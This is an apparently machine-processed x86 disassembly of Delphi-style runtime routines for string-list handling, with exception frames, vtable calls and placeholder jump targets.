mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43d4f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d5a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43d584
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d58b
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0x38 ]
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_43d5b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43d60d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
sub_43d624
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x4 ]
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_43d648
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43d718
xor al 0x1
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_43d6a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_43de28
mov eax [ ebp - 0x8 ]
push eax
push sub_43e13c
push ebp
call sub_43d648
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d6f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_43d718
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d7bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d7c3
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_44cb04
retn
mov eax [ ebp - 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x20 ]
pop eax
call sub_44ce70
jne r-xdata
sub_43d7d4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push ebp
call sub_43d7cc
pop ecx
push eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
jmp sub_44c7a8
sub_43d814
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d866
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_44e378
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43d7d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d86d
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_43d874
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d954
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43d932
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d939
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
sub_43d960
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43d994
push ebp
mov ebp esp
add esp 0xfffffff4
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d9e1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0xc ]
call sub_44cf24
call sub_446a2c
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d9e8
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43d9f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43daed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
xor edx edx
call sub_44cbc8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43daf4
lea eax [ ebp - 0x28 ]
call sub_44cae0
lea eax [ ebp - 0x20 ]
call sub_44cae0
retn
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x28 ]
call sub_44cd60
add eax 0x2
add [ ebp - 0x14 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ eax ] 0xd
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov [ eax ] 0xa
inc [ ebp - 0x1c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
call sub_44bbe8
mov eax [ ebp - 0x10 ]
add [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_44cd60
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
sub_43dafc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43db76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db7d
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4462cc
test eax eax
je r-xdata
sub_43db88
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
sub_43dbd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43dc08
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x20
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eda4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43dc57
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc5e
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_43dc64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43dd0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43dced
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_43eac4
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_43ea80
sub ebx eax
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_44cbc8
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dcf4
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
sub_43dd18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ddc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ddcc
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43dda8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43dbd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
sub_43ddd4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43dbd4
mov esp ebp
pop ebp
retn
sub_43de28
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43decc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_440b30
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43dea7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_43fc8c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44187c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43deae
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
sub_43ded8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0xffff
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eda4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43df2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df31
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_43df38
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43df8d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0xc ]
call sub_44cd60
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df94
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43dfa8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ ebp - 0x8 ]
call sub_44e3e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_43dff4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e03f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_44cc98
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e046
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43e04c
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e120
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d624
xor eax eax
push ebp
push sub_43e103
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e10a
mov eax [ ebp - 0x4 ]
call sub_43d6f4
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_44cbc8
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0xd
jne r-xdata
sub al 0xa
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp - 0xc ]
sub al 0x3
jne r-xdata
inc [ ebp - 0xc ]
inc [ ebp - 0xc ]
sub_43e13c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e1bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_442030
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_442044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1c2
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_442058
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_43e1c8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43d450
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
mov edx [ r-xdata ]
call sub_44d340
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43e244
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x78 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e72c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x19 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43d814
jmp r-xdata
sub_43e2b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_43e2dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_43e308
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
mov edx [ r-xdata ]
call sub_44d340
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
sub_43e354
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
sub eax [ ebp - 0x8 ]
mov ecx eax
shl ecx 0x3
mov eax [ ebp - 0x4 ]
